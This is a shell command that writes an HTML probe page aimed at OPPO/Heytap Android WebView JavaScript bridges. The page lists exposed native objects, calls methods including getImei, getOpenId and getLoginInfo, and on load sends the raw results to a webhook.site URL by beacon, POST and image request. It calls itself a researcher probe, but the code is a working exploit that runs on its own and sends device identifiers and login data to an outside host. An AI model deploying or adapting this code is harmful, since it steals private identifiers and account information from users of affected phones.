cd ~/work/oppo-webbridge-probe

cat > index.html <<'HTML'
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO Multi Bridge Sensitive Probe v9</title>
  <style>
    body { background:#000; color:#eee; font-family:sans-serif; padding:20px; }
    button { padding:12px 18px; margin:8px 0; font-size:18px; }
    pre { background:#eee; color:#111; padding:14px; white-space:pre-wrap; word-break:break-word; }
    .warn { color:#ff4d6d; font-weight:bold; }
  </style>
</head>
<body>
<h1>OPPO Multi Bridge Sensitive Probe v9</h1>
<p class="warn">RAW local display + RAW webhook for researcher-owned device.</p>
<button onclick="run()">Run v9 probe</button>
<pre id="out">WAITING</pre>

<script>
const WEBHOOK = "https://webhook.site/3947f7d3-968a-409a-9d5f-3bc7003d3df2";

const OBJECTS = [
  "android",
  "__ISCbridge__",
  "user",
  "hijack",
  "preload",
  "HeytapNativeApi",
  "HeytapTheme",
  "OppoPaySdk",
  "XunYouBridge",
  "PrivacyAgreement",
  "android_feedback"
];

const READONLY_METHODS = [
  "getImei",
  "getOpenId",
  "getLoginInfo",
  "isLogin",
  "getChannelId",
  "getPackageName",
  "getDeviceModel",
  "getNetworkType",
  "getRomVersion",
  "getRomVersionCode",
  "getStatusBarHeight",
  "isInstalled",
  "getProgress",
  "getButtonStatus"
];

function s(x) {
  try {
    if (x === undefined) return "undefined";
    if (x === null) return "null";
    if (typeof x === "string") return x;
    if (typeof x === "number" || typeof x === "boolean") return String(x);
    return JSON.stringify(x);
  } catch(e) {
    try { return String(x); } catch(_) { return "[unstringifiable]"; }
  }
}

function describeObject(name) {
  const obj = window[name];
  const out = {
    name,
    exists: !!obj,
    type: typeof obj,
    tag: obj ? Object.prototype.toString.call(obj) : null,
    ownKeys: [],
    functionKeys: [],
    calls: []
  };

  if (!obj) return out;

  try {
    out.ownKeys = Object.getOwnPropertyNames(obj).slice(0, 200);
    out.functionKeys = out.ownKeys.filter(k => {
      try { return typeof obj[k] === "function"; } catch(e) { return false; }
    });
  } catch(e) {
    out.keyError = s(e);
  }

  for (const m of READONLY_METHODS) {
    const item = { method:m, exists:false, ok:false, returnType:null, rawReturnValue:null, length:null, empty:null, error:null };
    try {
      item.exists = typeof obj[m] === "function";
      if (!item.exists) {
        item.error = "missing_or_not_function";
      } else {
        const ret = obj[m]();
        const raw = s(ret);
        item.ok = true;
        item.returnType = typeof ret;
        item.rawReturnValue = raw;
        item.length = raw.length;
        item.empty = raw === "" || raw === "undefined" || raw === "null";
      }
    } catch(e) {
      item.error = s(e && (e.stack || e.message || e));
    }
    out.calls.push(item);
  }

  return out;
}

function send(payload) {
  const json = JSON.stringify(payload);

  try {
    navigator.sendBeacon(
      WEBHOOK + "/oppo-v9-multibridge-raw-beacon",
      new Blob([json], { type: "text/plain" })
    );
  } catch(e) {}

  try {
    fetch(WEBHOOK + "/oppo-v9-multibridge-raw-post", {
      method: "POST",
      mode: "no-cors",
      headers: { "content-type": "text/plain" },
      body: json
    }).catch(function(){});
  } catch(e) {}

  try {
    new Image().src =
      WEBHOOK +
      "/oppo-v9-multibridge-raw-get?event=OPPO_V9_MULTIBRIDGE_RAW_RESULT&t=" +
      Date.now() +
      "&d=" +
      encodeURIComponent(json).slice(0, 7500);
  } catch(e) {}
}

window.run = function() {
  const payload = {
    eventType: "OPPO_V9_MULTIBRIDGE_RAW_RESULT",
    version: "v9_multibridge_raw",
    ts: new Date().toISOString(),
    href: location.href,
    ua: navigator.userAgent,
    xRequestedWithExpected: "com.oplus.games",
    rawValuesSentToWebhook: true,
    objects: OBJECTS.map(describeObject)
  };

  document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
  send(payload);
};

setTimeout(run, 1200);
</script>
</body>
</html>
